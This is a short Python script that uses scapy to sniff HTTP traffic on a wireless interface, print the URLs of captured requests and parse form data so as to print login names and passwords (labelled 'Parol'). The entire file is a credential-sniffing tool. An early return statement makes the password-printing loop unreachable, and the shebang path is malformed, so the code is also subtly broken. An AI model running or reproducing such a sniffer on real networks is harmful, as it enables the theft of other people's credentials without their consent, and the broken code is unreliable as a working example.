#!usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
from urllib.parse import parse_qs


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path



def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request>> " + str(url))
        if packet.haslayer(scapy.Raw):
            parsed_data = parse_qs(packet[scapy.Raw].load)
            return parsed_data

            for key, value in parsed_data.items():
                print(f"Login: {key}: Parol: {value[0]}")

sniff("wlan0")